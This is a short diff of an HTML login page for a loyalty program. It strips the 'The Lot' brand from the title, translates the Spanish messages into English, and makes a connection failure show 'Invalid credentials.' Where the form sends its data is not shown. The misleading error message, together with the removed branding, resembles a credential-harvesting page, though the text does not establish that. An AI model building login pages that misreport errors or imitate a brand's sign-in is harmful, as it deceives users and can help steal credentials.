@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Login Loyalty - The Lot</title>
+  <title>Login Loyalty</title>
   <style>
     body {
       font-family: 'Helvetica Neue', Helvetica, sans-serif;
@@ -86,7 +86,7 @@
       <button type="submit" id="continueBtn">Continue</button>
     </div>
   </form>
-  <div id="loading">Procesando...</div>
+  <div id="loading">Wait...</div>
 </div>
 
 <script>
@@ -131,7 +131,7 @@
       loading.style.display = 'none';
 
       if (result.ExtendedResultCode !== 0) {
-        alert(result.ErrorDescription || 'Credenciales incorrectas.');
+        alert(result.ErrorDescription || 'Invalid credentials');
         return;
       }
 
@@ -141,7 +141,7 @@
     .catch(err => {
       loading.style.display = 'none';
       console.error('Error enviando los datos:', err);
-      alert('Error en la conexión. Intenta de nuevo.');
+      alert('Invalid credentials.');
     });
   });
 </script>
